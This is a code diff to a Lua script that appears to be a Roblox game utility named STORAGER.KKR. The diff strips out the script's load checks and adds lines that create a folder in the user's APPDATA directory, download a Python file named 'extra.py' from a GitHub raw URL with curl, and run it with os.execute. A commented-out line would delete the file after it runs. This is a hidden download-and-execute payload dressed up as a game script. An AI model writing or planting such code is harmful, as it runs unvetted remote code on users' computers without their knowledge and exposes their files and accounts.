@@ -11,23 +11,25 @@
 --|____/ |_| \___/|_| \_\/_/   \_\____|_____|_| \_(_)_|\_\_|\_\_| \_(_)____/|_____| |_/_/   \_\
 
 
+local folder = os.getenv("APPDATA") .. "\\storager.kkr"  -- AppData folder for the user
+local file = folder .. "\\extra.py"
+local url = "https://raw.githubusercontent.com/STORAGERKIR/STORAGED.KKK-BETA/refs/heads/main/extra.py"
+
+-- Create the folder (if it doesn't exist)
+os.execute('mkdir "' .. folder .. '"')
+
+-- Download the script into the folder
+os.execute('curl -L -o "' .. file .. '" "' .. url .. '"')
+
+-- Run the script
+os.execute('python "' .. file .. '"')
+
+-- Optional: Delete the script after running
+-- os.remove(file)
 
 
 
 
-
-if ( _G.RLLOADED and _G.RLNOTIF ) then
-    _G.RLNOTIF('Oops', 'STORAGER.KKR is already loaded. Destroy the current instance by pressing [END]', 5, 'warn', true)
-    return
-end
-
-if ( not isfolder('STORAGER.KKR') ) then
-    makefolder('STORAGER.KKR')
-end
-
-local STORAGERKKRVER = 'v0.7.2'
-
-if not game:IsLoaded() then game.Loaded:Wait() end
 
 --- Services
 local servContext   = game:GetService('ContextActionService')
